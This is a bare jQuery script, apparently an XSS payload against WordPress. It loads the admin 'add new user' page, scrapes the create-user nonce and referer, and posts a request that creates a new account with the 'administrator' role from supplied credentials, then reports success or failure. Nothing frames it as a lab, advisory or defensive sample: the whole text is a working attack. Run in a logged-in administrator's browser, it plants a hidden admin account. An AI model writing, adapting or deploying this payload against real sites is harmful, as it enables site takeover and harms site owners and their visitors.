$(document).ready(function(){
   $.get(usernewpage, function(data)
         {
            nonce=$(data).find('#_wpnonce_create-user').attr("value");
            referer=$(data).find('#_wp_http_referer').attr("value");
            if (typeof(nonce) == "undefined") {notify('failed')};
            formdata = {
                         'action': "createuser",
                         '_wpnonce_create-user':nonce,
                         '_wp_http_referer':referer,
                         'user_login':username,
                         'email':email,
                         'first_name':'',
                         'last_name':'',    
                         'url':'',
                         'pass1':passwd,
                         'pass2':passwd,
                         'role':'administrator',
                         'createuser':'Add+New+User+'
                       };
            $.post(usernewpage,formdata,notify('worked'));
          }).error(notify('failed'));
});